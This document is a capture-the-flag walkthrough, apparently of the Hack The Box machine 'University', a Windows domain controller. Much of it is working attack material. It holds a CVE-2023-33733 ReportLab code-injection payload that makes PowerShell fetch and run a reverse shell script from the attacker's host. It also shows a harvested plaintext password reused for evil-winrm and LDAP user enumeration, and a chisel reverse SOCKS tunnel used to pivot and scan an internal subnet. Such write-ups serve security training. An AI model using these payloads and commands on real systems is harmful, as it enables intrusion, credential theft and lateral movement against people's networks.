![image](https://github.com/user-attachments/assets/9d5ed6d1-39f1-4b0c-a85c-b3e794e4048c)

## 1. Recon

### 1.1. Port Scan `nmap`

```console
root@kali:~# nmap -Pn -A 10.10.11.39
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-27 12:45 +08
Nmap scan report for 10.10.11.39
Host is up (0.0046s latency).
Not shown: 987 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          nginx 1.24.0
|_http-title: Did not follow redirect to http://university.htb/
|_http-server-header: nginx/1.24.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-27 11:30:46Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: university.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: university.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=12/27%OT=53%CT=1%CU=36551%PV=Y%DS=2%DC=T%G=Y%TM=676
OS:E311C%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10E%TI=I%CI=I%II=I%SS=S
OS:%TS=U)OPS(O1=M552NW8NNS%O2=M552NW8NNS%O3=M552NW8%O4=M552NW8NNS%O5=M552NW
OS:8NNS%O6=M552NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(
OS:R=Y%DF=Y%T=80%W=FFFF%O=M552NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W
OS:=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T
OS:5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=
OS:O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF
OS:=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80
OS:%CD=Z)

Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2024-12-27T11:31:16
|_  start_date: N/A
|_clock-skew: 6h45m06s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

TRACEROUTE (using port 199/tcp)
HOP RTT     ADDRESS
1   4.64 ms 10.10.14.1
2   4.70 ms 10.10.11.39

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.48 seconds
```

The target machine appears to be a domain controller, let's add the hosts records to Kali:

```sh
cat << EOF >> /etc/hosts
10.10.11.39 university.htb
10.10.11.39 university.htb0
EOF
```

## 2. Exploring

### 2.1. `80`

![image](https://github.com/user-attachments/assets/c54bf4a1-72f9-4ee4-b924-34f3856fe4d5)

User login to the site accepts password and signed certificate methods, and there are `Student` and `Professor` account types for registration

![image](https://github.com/user-attachments/assets/61c6deb6-8e94-4589-9df9-079518404561)

![image](https://github.com/user-attachments/assets/f191adcf-2642-4f8d-9c7b-077186c911bc)

`Professor` registration requires review and approval

![image](https://github.com/user-attachments/assets/4d898275-f86d-4486-81fc-6a70f6329564)

Let's register for a `Student` account

![image](https://github.com/user-attachments/assets/a357d888-67cc-4e84-8f88-1a89388fdea0)

The registered `Student` account is immediately usable for login

![image](https://github.com/user-attachments/assets/2e6b4626-b602-4087-b1d4-f968de386b81)

While testing each field in the profile, it seems that the Bio changes `<script>alert(123)</script>` to just `alert(123)`

→ the site may be susceptible to cross-site scripting

![image](https://github.com/user-attachments/assets/50b9f588-5b7d-43fc-a8af-293e4253d796)

### 2.2. Getting a reverse shell

Some searching shows that this (https://github.com/c53elyas/CVE-2023-33733) may be the vulnerability 

PoC code, replace `curl http://xxx.xxx.xxx.xxx/` with the code to be executed

```xml
<para>
  <font color="[[[getattr(pow, Word('__globals__'))['os'].system('curl http://xxx.xxx.xxx.xxx/') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
    exploit
  </font>
</para>
```

There's a reverse shell PowerShell script in this repo that should work: https://github.com/joetanx/ctf/blob/main/reverse.ps1

Prepare Kali

```sh
curl -sLo /var/www/html/reverse.ps1 https://github.com/joetanx/ctf/raw/main/reverse.ps1
sed -i 's/<ADDRESS>/10.10.14.35/' /var/www/html/reverse.ps1
sed -i 's/<PORT>/4444/' /var/www/html/reverse.ps1
```

Start console:

```sh
root@kali:~# rlwrap nc -nvlp 4444
listening on [any] 4444 ...
```

Edit the PoC code to this:

```xml
<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('powershell Invoke-WebRequest -Uri http://10.10.14.35/reverse.ps1 -OutFile ./reverse.ps1') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">exploit</font></para>
```

> [!Note]
>
> `powershell Invoke-WebRequest -Uri http://10.10.14.35/reverse.ps1 -OutFile ./reverse.ps1'`
>
> Downloads the reverse shell script

Put into the Bio editor, submit, then select profile export (it is the html to pdf generator that would execute the command)

![image](https://github.com/user-attachments/assets/50a1aa58-9945-4db2-a1fe-208b2d04e0b0)

Next, edit the PoC code to this:

```xml
<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('powershell ./reverse.ps1') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">exploit</font></para>
```

> [!Note]
>
> `powershell ./reverse.ps1`
>
> Runs the reverse shell script

Put into the Bio editor, submit, then select profile export (it is the html to pdf generator that would execute the command)

![image](https://github.com/user-attachments/assets/59d24bed-ca36-4fdf-b3f5-ed1246da4534)

Reverse shell hooked as `university\wao` account

```pwsh
listening on [any] 4444 ...
connect to [10.10.14.35] from (UNKNOWN) [10.10.11.39] 62164

PS C:\Web\University> whoami /all

USER INFORMATION
----------------

User Name      SID
============== =============================================
university\wao S-1-5-21-2056245889-740706773-2266349663-1106


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\BATCH                         Well-known group S-1-5-3                                       Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                       Mandatory group, Enabled by default, Enabled group
UNIVERSITY\Web Developers                  Group            S-1-5-21-2056245889-740706773-2266349663-1129 Mandatory group, Enabled by default, Enabled group
Service asserted identity                  Well-known group S-1-18-2                                      Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

### 2.3. Searching for interesting content in `C:\Web\`

Using `Get-ChildItem` + `-Recurse` reveals:
- Database backup files at `C:\Web\DB Backups`
- Backup script `C:\Web\DB Backups\db-backup-automator.ps1` that contains password for `wao`: `WebAO1337`

```pwsh
PS C:\Web\University> Get-ChildItem -Path C:\Web -Recurse


    Directory: C:\Web


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/25/2024   4:53 PM                DB Backups
d-----        2/12/2024   4:54 PM                nginx-1.24.0
d-----       12/27/2024   5:01 AM                University


    Directory: C:\Web\DB Backups


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/25/2023  12:03 AM          24215 DB-Backup-2023-01-25.zip
-a----        2/25/2023  12:03 AM          24215 DB-Backup-2023-02-25.zip
-a----        3/25/2023  12:03 AM          24215 DB-Backup-2023-03-25.zip
-a----        4/25/2023  12:04 AM          24215 DB-Backup-2023-04-25.zip
-a----        5/25/2023  12:04 AM          24215 DB-Backup-2023-05-25.zip
-a----        6/25/2023  12:04 AM          24215 DB-Backup-2023-06-25.zip
-a----        7/25/2023  12:04 AM          24215 DB-Backup-2023-07-25.zip
-a----        8/25/2023  12:04 AM          24215 DB-Backup-2023-08-25.zip
-a----        9/25/2023  12:05 AM          24215 DB-Backup-2023-09-25.zip
-a----       10/25/2023  12:05 AM          24215 DB-Backup-2023-10-25.zip
-a----       11/25/2023  12:05 AM          24215 DB-Backup-2023-11-25.zip
-a----       12/25/2023  12:05 AM          24215 DB-Backup-2023-12-25.zip
-a----        1/25/2024  12:06 AM          24215 DB-Backup-2024-01-25.zip
-a----        2/25/2024  12:06 AM          24215 DB-Backup-2024-02-25.zip
-a----        3/25/2024  12:07 AM          24215 DB-Backup-2024-03-25.zip
-a----        4/25/2024  12:07 AM          24215 DB-Backup-2024-04-25.zip
-a----       10/14/2024   9:35 AM            386 db-backup-automator.ps1


    Directory: C:\Web\nginx-1.24.0


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/12/2024   5:47 PM                conf
d-----        2/12/2024   3:46 PM                contrib
d-----        2/12/2024   3:46 PM                docs
d-----        2/12/2024   3:46 PM                html
d-----        2/17/2024   3:06 AM                logs
d-----        2/12/2024   4:45 PM                temp
-a----        4/11/2023   8:29 AM        3811328 nginx.exe
-a----         3/3/2024   4:10 AM         111067 off
-a----        2/15/2024  12:36 AM             46 start.bat

⋮

    Directory: C:\Web\University


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/15/2024   8:13 AM                CA
d-----        2/19/2024   3:54 PM                static
d-----       10/15/2024  11:42 AM                University
-a----       12/27/2024   5:01 AM         245760 db.sqlite3
-a----       12/27/2024   5:01 AM           5459 JfMLsX.html
-a----       12/27/2024   5:01 AM              0 JfMLsX.pdf
-a----        12/3/2023   4:28 AM            666 manage.py
-a----       12/27/2024   5:00 AM            533 reverse.ps1
-a----        2/15/2024  12:51 AM            133 start-server.bat


    Directory: C:\Web\University\CA


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/15/2024   5:51 AM           1399 rootCA.crt
-a----        2/15/2024   5:48 AM           1704 rootCA.key
-a----        2/25/2024   5:41 PM             42 rootCA.srl

⋮

PS C:\Web\University> type "C:\Web\DB Backups\db-backup-automator.ps1"
$sourcePath = "C:\Web\University\db.sqlite3"
$destinationPath = "C:\Web\DB Backups\"
$7zExePath = "C:\Program Files\7-Zip\7z.exe"

$zipFileName = "DB-Backup-$(Get-Date -Format 'yyyy-MM-dd').zip"
$zipFilePath = Join-Path -Path $destinationPath -ChildPath $zipFileName
$7zCommand = "& `"$7zExePath`" a `"$zipFilePath`" `"$sourcePath`" -p'WebAO1337'"
Invoke-Expression -Command $7zCommand
```

### 2.4. Exploring with found credentials

#### 2.4.1. Attempt connection

```console
root@kali:~# evil-winrm -u 'WAO' -p 'WebAO1337' -i 10.10.11.39

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\WAO\Documents> whoami
university\wao
```

#### 2.4.2. Scan for users

```console
root@kali:~# netexec ldap 10.10.11.39 -u wao -p WebAO1337 --users
SMB         10.10.11.39     445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:university.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.39     389    DC               [+] university.htb\wao:WebAO1337
LDAP        10.10.11.39     389    DC               [*] Enumerated 26 domain users: university.htb
LDAP        10.10.11.39     389    DC               -Username-                    -Last PW Set-       -BadPW- -Description-
LDAP        10.10.11.39     389    DC               Administrator                 2024-09-11 21:24:04 0       Built-in account for administering the computer/domain
LDAP        10.10.11.39     389    DC               Guest                         <never>             0       Built-in account for guest access to the computer/domain
LDAP        10.10.11.39     389    DC               krbtgt                        2024-02-12 23:36:45 0       Key Distribution Center Service Account
LDAP        10.10.11.39     389    DC               John.D                        2024-02-13 02:06:53 0
LDAP        10.10.11.39     389    DC               George.A                      2024-02-13 02:11:09 0
LDAP        10.10.11.39     389    DC               WAO                           2024-09-16 16:46:27 0
LDAP        10.10.11.39     389    DC               hana                          2024-02-20 03:40:39 0
LDAP        10.10.11.39     389    DC               karma.watterson               2024-02-20 03:44:17 0
LDAP        10.10.11.39     389    DC               Alice.Z                       2024-02-20 03:45:02 0
LDAP        10.10.11.39     389    DC               Steven.P                      2024-02-28 06:53:59 0
LDAP        10.10.11.39     389    DC               Karol.J                       2024-02-20 03:51:07 0
LDAP        10.10.11.39     389    DC               Leon.K                        2024-02-20 03:52:08 0
LDAP        10.10.11.39     389    DC               A.Crouz                       2024-02-20 03:53:07 0
LDAP        10.10.11.39     389    DC               Kai.K                         2024-02-20 03:54:16 0
LDAP        10.10.11.39     389    DC               Arnold.G                      2024-02-20 03:56:15 0
LDAP        10.10.11.39     389    DC               Kareem.A                      2024-02-20 03:58:15 0
LDAP        10.10.11.39     389    DC               Lisa.K                        2024-02-20 03:59:30 0
LDAP        10.10.11.39     389    DC               Jakken.C                      2024-02-20 04:01:27 0
LDAP        10.10.11.39     389    DC               Nya.R                         2024-02-20 04:04:00 0
LDAP        10.10.11.39     389    DC               Brose.W                       2024-02-20 04:08:34 0
LDAP        10.10.11.39     389    DC               Choco.L                       2024-02-20 04:17:25 0
LDAP        10.10.11.39     389    DC               Rose.L                        2024-02-20 04:18:36 0
LDAP        10.10.11.39     389    DC               Emma.H                        2024-02-28 06:42:23 0
LDAP        10.10.11.39     389    DC               C.Freez                       2024-02-20 04:27:06 0
LDAP        10.10.11.39     389    DC               Martin.T                      2024-02-20 05:31:46 0
LDAP        10.10.11.39     389    DC               William.B                     2024-02-28 07:20:12 0       Remote Volume Manager
```

### 2.5. Checking for other points of access

The network configuration reveals that the target is attached to a vSwitch in the `192.168.99.0/24` subnet

```pwsh
PS C:\Web\University> ipconfig

Windows IP Configuration


Ethernet adapter vEthernet (Internal-VSwitch1):

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::47c0:fbc9:2d7b:e4bb%6
   IPv4 Address. . . . . . . . . . . : 192.168.99.1
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . :

Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . :
   IPv6 Address. . . . . . . . . . . : dead:beef::7340:763d:93a2:80e8
   Link-local IPv6 Address . . . . . : fe80::cbd:2d69:2221:ae4b%4
   IPv4 Address. . . . . . . . . . . : 10.10.11.39
   Subnet Mask . . . . . . . . . . . : 255.255.254.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:2397%4
                                       10.10.10.2
```

Do a quick ping sweep from the target to find any live targets in the subnet

```
PS C:\Users\WAO\Documents> cmd /c "for /L %i in (1,1,255) do @ping -n 1 -w 1 192.168.99.%i > nul && echo 192.168.99.%i is up."
192.168.99.1 is up.
192.168.99.2 is up.
192.168.99.12 is up.
```

### 2.6. Investigate new live targets found in the subnet

#### 2.6.1. Establish dynamic port proxy to pivot to the subnet

Start chisel listener on Kali

```console
root@kali:~# chisel server --reverse -p 8080
2024/12/27 21:51:08 server: Reverse tunnelling enabled
2024/12/27 21:51:08 server: Fingerprint t+uug8LA+uXigXwogI+nJPtv97vwafhxzx4stLYG/yM=
2024/12/27 21:51:08 server: Listening on http://0.0.0.0:8080
```

Download Windows Chisel to Kali web server

```sh
VERSION=$(curl -sI https://github.com/jpillora/chisel/releases/latest | grep location: | cut -d / -f 8 | tr -d '\r' | tr -d 'v')
curl -sLO https://github.com/jpillora/chisel/releases/download/v$VERSION/chisel_${VERSION}_windows_amd64.gz
gzip -d chisel_${VERSION}_windows_amd64.gz
mv chisel_${VERSION}_windows_amd64 /var/www/html/chisel.exe
```

On Target:

```pwsh
PS C:\Users\WAO\Documents> certutil.exe -urlcache -f -split http://10.10.14.35/chisel.exe
****  Online  ****
  000000  ...
  94f000
CertUtil: -URLCache command completed successfully.
PS C:\Users\WAO\Documents> .\chisel.exe client 10.10.14.35:8080 R:socks
chisel.exe : 2024/12/27 12:38:41 client: Connecting to ws://10.10.14.35:8080
    + CategoryInfo          : NotSpecified: (2024/12/27 12:3...0.10.14.35:8080:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
2024/12/27 12:38:41 client: Connected (Latency 666.6Âµs)
```

Kali should show connected:

```
2024/12/27 21:53:36 server: session#1: Client version (1.10.1) differs from server version (1.10.1-0kali1)
2024/12/27 21:53:36 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

Edit `/etc/proxychains4.conf` to change default `tor` setting to the chisel socks proxy

```console
root@kali:~# sed -i 's/socks4  127.0.0.1 9050/socks5  127.0.0.1 1080/' /etc/proxychains4.conf

root@kali:~# sed -i '/^socks4/s/socks4/socks5/' /etc/proxychains4.conf

root@kali:~# grep "^socks5" /etc/proxychains4.conf
socks5  127.0.0.1 1080
```

#### 2.6.2. Port Scan `nmap` on the found live targets

> [!Tip]
>
> 1. ProxyChains only work for TCP traffic, i.e. ICMP (ping, traceroute) and SYN (-sS) scans will not work over ProxyChains
> 2. nmap uses `-sS` by default, so the `-sT` option to use TCP Connect() scan is required
> 3. Use `-O -sV -sC` instead of `-A` to omit running traceroute
> 4. nmap scan would be quite slow over ProxyChains, use `-F` to limit the port range to top 100 ports

##### 192.168.99.2

```console
root@kali:~# proxychains -q nmap -Pn -sT -O -sV -sC -F 192.168.99.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-27 23:02 +08
Nmap scan report for 192.168.99.2
Host is up (1.1s latency).
Not shown: 97 closed tcp ports (conn-refused)
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
OS fingerprint not ideal because: Didn't receive UDP response. Please try again with -sSU
No OS matches for host
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2024-12-27T21:50:33
|_  start_date: N/A
|_clock-skew: 6h45m04s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 157.72 seconds
```

##### 192.168.99.12

```console
root@kali:~# proxychains -q nmap -Pn -sT -O -sV -sC -F 192.168.99.12
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-27 23:03 +08
Nmap scan report for 192.168.99.12
Host is up (1.2s latency).
Not shown: 99 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 36:8b:46:18:8e:07:78:b6:e0:0f:97:a0:f6:e1:1e:00 (RSA)
|   256 17:7a:b3:84:00:58:b7:46:2f:5b:6e:30:b8:2f:ab:73 (ECDSA)
|_  256 90:ef:af:b3:76:2d:60:80:03:4f:00:63:7b:b9:d6:45 (ED25519)
OS fingerprint not ideal because: Didn't receive UDP response. Please try again with -sSU
No OS matches for host
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 183.38 seconds
```
